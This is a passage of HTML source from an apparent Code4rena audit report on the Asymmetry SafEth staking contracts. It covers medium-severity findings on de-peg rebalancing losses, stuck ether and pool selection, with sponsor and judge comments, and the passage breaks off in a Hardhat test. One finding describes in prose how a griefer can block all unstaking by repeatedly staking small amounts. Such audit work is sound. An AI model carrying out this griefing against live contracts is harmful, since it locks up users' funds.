class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>As long as any one of the above code failed, the whole <code>stake()/unstake()/rebalanceToWeights()</code> will revert, and users’ fund would be locked until the external dependency is resolved, the contract will lose the core functionality.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>try/catch</code> to skip the failed function call, then the contract will be more robust to unexpected situations. In case of <code>deposit()</code>, redistribute the fund into the other derivatives according to the weights might be an option, since re-balance will be done regularly. For <code>withdraw()</code>, maybe temporarily record the missed amount, and give the user opportunity to retrieve later.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770#issuecomment-1500378678\">toshiSat (Asymmetry) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770#issuecomment-1500380114\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>This is known and expected behavior. We feel like having all-or-nothing failures like this simplify the logic overall and make things safer at the expense of some edge cases where deposit can fail. We can always upgrade the contract if it becomes a problem.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#out-of-scope\">Asymmetry commented</a>:</strong></p>\n<blockquote>\n<p>Out of scope for mitigation review. This is as expected.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-in-de-peg-scenario-forcing-full-exit-from-every-derivative--immediately-re-entering-can-cause-big-losses-for-depositors\" style=\"position:relative;\"><a href=\"#m-07-in-de-peg-scenario-forcing-full-exit-from-every-derivative--immediately-re-entering-can-cause-big-losses-for-depositors\" aria-label=\"m 07 in de peg scenario forcing full exit from every derivative  immediately re entering can cause big losses for depositors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765\">[M-07] In de-peg scenario, forcing full exit from every derivative &#x26; immediately re-entering can cause big losses for depositors</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765\">0Kage</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/895\">Co0nan</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/749\">deliriusz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/676\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/640\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/598\">IgorZuk</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/589\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/533\">Bahurum</a></em></p>\n<p>In a de-peg scenario, there will be a general flight to safety (<code>ETH</code>) from users across the board. All pools will have a uni-directional sell-pressure where users prefer to exchange derivative token for WETH.</p>\n<p>There are 3 sources of losses in this scenario</p>\n<ul>\n<li>Protocol currently doesn’t localize exit &#x26; force-exits all positions. So even non de-pegged assets are forced to exit causing further sell-side pressure that can further widen slippages</li>\n<li>Protocol immediately tries to re-enter the position based on new weights. Since de-peg in one asset can trigger de-peg in another (eg. USDT de-pegged immediately after UST collapse), immediately entering into another position after exiting one might cause more. A better approach would be to simply exit stressed positions &#x26; waiting out for the market/gas prices to settle down. Separating exit &#x26; re-entry functions can save depositors from high execution costs.</li>\n<li>Protocol is inefficiently exiting &#x26; re-entering the positions. Instead of taking marginal positions to rebalance, current implementation first fully exits &#x26; then re-enters back based on new weights (see POC below). Since any slippage losses are borne by depositors, a better implementation can save losses to users</li>\n</ul>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>Assume positions are split in following ratio by value: 10% frax-Eth, 70% stEth and 20% rEth</li>\n<li>Now frax-Eth starts to de-peg, forcing protocol to exit frax-Eth and rebalance to say, 80% stEth and 20% rEth</li>\n<li>Current rebalancing first exits 70% stEth, 20% rEth and then re-enters 80% stEth and 20% rEth</li>\n<li>A marginal re-balancing would have only needed protocol to exit 10% frax-Eth and divert that 10% to stEth</li>\n</ul>\n<p>By executing huge, unnecessary txns, protocol is exposing depositors to high slippage costs on the entire pool.</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider following improvements to <code>rebalanceToWeights</code>:</p>\n<ul>\n<li>Separate exits &#x26; entries. Split the functionality to <code>exit</code> and <code>re-enter</code>. In stressed times or fast evolving de-peg scenarios, protocol owners should first ensure an orderly exit. And then wait for markets to settle down before re-entering new positions</li>\n<li>Localize exits, ie. if derivative A is de-pegging, first try to exit that derivative position before incurring exit costs on derivative B and C</li>\n<li>Implement a marginal re-balancing - for protocol’s whose weights have increased, avoid exit and re-entry. Instead just increment/decrement based on marginal changes in net positions</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765#issuecomment-1500385145\">toshiSat (Asymmetry) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is definitely valid, it would require a black swan event.  We have thought about this, and might implement this for v2.</p>\n<p>This should be half confirmed, because I think we will implement the marginal rebalancing. I’m not sure if this is High severity, I will leave that up to judge.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765#issuecomment-1514763624\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The report shows how in case of a black swan event, the protocol could take a significant loss when calling <code>rebalanceToWeights</code> that could easily be avoided by implementing at least marginal re-balancings. </p>\n<p>However, considering that there is no need to call <code>rebalanceToWeights</code> even in the case of a black swan event unless there is a governance decision to do so, I think Medium Severity is appropriate.</p>\n<p>Note that even without black swan event, calling <code>rebalanceToWeights</code> would likely lead to a significant loss due to the current ineffective implementation. But there is no specific need to call this action unless the owner or the DAO wants to force the rebalancing.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#out-of-scope\">Asymmetry commented</a>:</strong></p>\n<blockquote>\n<p>Out of scope for mitigation review. Will need a black swan event to happen and will upgrade rebalanceToWeights later to handle this.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-possible-dos-on-unstake\" style=\"position:relative;\"><a href=\"#m-08-possible-dos-on-unstake\" aria-label=\"m 08 possible dos on unstake permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685\">[M-08] Possible DoS on <code>unstake()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685\">Tricko</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/522\">shaka</a> and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/202\">rvierdiiev</a></em></p>\n<p>RocketPool rETH tokens have a <a href=\"https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L157-L172\">deposit delay</a> that prevents any user who has recently deposited to transfer or burn tokens. In the past this delay was set to 5760 blocks mined (aprox. 19h, considering one block per 12s). This delay can prevent asymmetry protocol users from unstaking if another user staked recently.</p>\n<p>While it’s not currently possible due to RocketPool’s configuration, any future changes made to this delay by the admins could potentially lead to a denial-of-service attack on the <code>ùnstake()</code> mechanism. This is a major functionality of the asymmetry protocol, and therefore, it should be classified as a high severity issue.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Currently, the delay is set to zero, but if RocketPool admins decide to change this value in the future, it could cause issues. Specifically, protocol users staking actions could prevent other users from unstaking for a few hours. Given that many users call the stake function throughout the day, the delay would constantly reset, making the unstaking mechanism unusable. It’s important to note that this only occurs when <code>stake()</code> is used through the <code>rocketDepositPool</code> route. If rETH is obtained from the Uniswap pool, the delay is not affected.</p>\n<p>A malicious actor can also exploit this to be able to block all <code>unstake</code> calls. Consider the following scenario where the delay was raised again to 5760 blocks. Bob (malicious actor) call <code>stakes()</code> with the minimum amount, consequently triggering deposit to RocketPool and resetting the deposit delay. Alice tries to <code>unstake</code> her funds, but during rETH burn, it fails due to the delay check, reverting the <code>unstake</code> call.</p>\n<p>If Bob manages to repeatedly <code>stakes()</code> the minimum amount every 19h (or any other interval less then the deposit delay), all future calls to <code>unstake</code> will revert.</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider modifying Reth derivative to obtain rETH only through the UniswapV3 pool, on average users will get less rETH due to the slippage, but will avoid any future issues with the deposit delay mechanism.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685#issuecomment-1500470612\">toshiSat (Asymmetry) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685#issuecomment-1525247050\">Picodes (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Use Chainlink to get rETH.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Not mitigated. Full details in report from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51\">adriro</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-09-non-ideal-rethweth-pool-used-pays-unnecessary-fees\" style=\"position:relative;\"><a href=\"#m-09-non-ideal-rethweth-pool-used-pays-unnecessary-fees\" aria-label=\"m 09 non ideal rethweth pool used pays unnecessary fees permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673\">[M-09] Non-ideal rETH/WETH pool used pays unnecessary fees</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673\">yac</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1148\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/603\">0x52</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/107\">Ruhum</a></em></p>\n<p>rETH is acquired using the Uniswap rETH/WETH pool. This solution has higher fees and lower liquidity than alternatives, which results in more lost user value than other solutions.</p>\n<p>The Uniswap rETH/WETH pool that is used in Reth.sol to make swaps has a liquidity of <code>$5 million</code>. In comparison, the Balancer rETH/WETH pool has a liquidity of <code>$80 million</code>. Even the Curve rETH/WETH pool has a liquidity of <code>$8 million</code>. The greater liquidity should normally offer lower slippage to users. In addition, the fees to swap with the Balancer pool are only 0.04% compared to Uniswap’s 0.05%. Even the Curve pool offers a lower fee than Uniswap with just a 0.037% fee. <a href=\"https://dune.com/drworm/rocketpool\">This Dune Analytics dashboard</a> shows that Balancer is where the majority of rETH swaps happen by volume.</p>\n<p>One solution to finding the best swap path for rETH is to use RocketPool’s <a href=\"https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L64\">RocketSwapRouter.sol contract <code>swapTo()</code> function</a>. When users visit the RocketPool frontend to swap ETH for rETH, this is the function that RocketPool calls for the user. RocketSwapRouter.sol automatically determines the best way to split the swap between Balancer and Uniswap pools.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Pools that can be used for rETH/WETH swapping:</p>\n<ul>\n<li><a href=\"https://etherscan.io/address/0xa4e0faA58465A2D369aa21B3e42d43374c6F9613\">Uniswap rETH/WETH pool</a>: <code>$5 million</code> in liquidity</li>\n<li><a href=\"https://app.balancer.fi/#/ethereum/pool/0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112\">Balancer rETH/WETH pool</a></li>\n<li><a href=\"https://curve.fi/#/ethereum/pools/factory-crypto-210/deposit\">Curve Finance rETH/ETH pool</a>: <code>$8 million</code> in liquidity</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L101\">Line where Reth.sol swaps WETH for rETH</a> with the Uniswap rETH/WETH pool.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Etherscan, Dune Analytics</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The best solution is to use the same flow as RocketPool’s frontend UI and to call <code>swapTo()</code> in <a href=\"https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L64\">RocketSwapRouter.sol</a>. An alternative is to modify Reth.sol to use the Balancer rETH/ETH pool for swapping instead of Uniswap’s rETH/WETH pool to better conserve user value by reducing swap fees and reducing slippage costs.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673#issuecomment-1500475916\">elmutt (Asymmetry) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673#issuecomment-1522589442\">d3e4 (warden) commented</a>:</strong></p>\n<blockquote>\n<p>What is the issue here? This is an improvement proposal (QA). </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673#issuecomment-1525233121\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>My reasoning was that it’s not an improvement proposal but a bug (sub-optimal of the AMM pool), hence it does qualify for Medium for “leak of value”.</p>\n<p>I have to admit that I hesitated but I leaned towards Medium because of the label “sponsor confirmed” suggesting that this finding provided value for the sponsor.</p>\n</blockquote>\n<p><strong>Asymmetry mitigated</strong></p>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/37\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/19\">0x52</a>.</p>\n<hr>\n<h2 id=\"m-10-stuck-ether-when-use-function-stake-with-empty-derivativesderivativecount--0\" style=\"position:relative;\"><a href=\"#m-10-stuck-ether-when-use-function-stake-with-empty-derivativesderivativecount--0\" aria-label=\"m 10 stuck ether when use function stake with empty derivativesderivativecount  0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363\">[M-10] Stuck ether when use function <code>stake</code> with empty <code>derivatives</code>(<code>derivativeCount</code> = 0)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363\">rotcivegaf</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1127\">ArbitraryExecution</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1113\">alexzoid</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1036\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/929\">brgltd</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/861\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/779\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/777\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/716\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/564\">idkwhatimdoing</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/529\">ToonVH</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/524\">codetilda</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/514\">pfapostol</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/503\">vagrant</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/477\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/472\">wait</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/355\">hihen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/262\">Cryptor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/226\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/186\">UdarTeam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/149\">7siech</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/117\">Co0nan</a></em></p>\n<p>After <code>initialize</code> the contract <code>SafEth</code>, if someone call <code>stake</code> before <code>addDerivative</code>, the function <code>stake</code> skip the two for cycles because the <code>derivativeCount</code> is equal to <code>0</code> and don’t <code>deposit</code> in the <code>derivative</code> contract also mint <code>0</code> tokens to the sender. Finally the amount of <code>msg.value</code> will stuck in the contract</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/* eslint-disable new-cap */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">network</span><span class=\"mtk1\">, </span><span class=\"mtk12\">upgrades</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;chai&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">SignerWithAddress</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@nomiclabs/hardhat-ethers/signers&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../typechain-types&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span 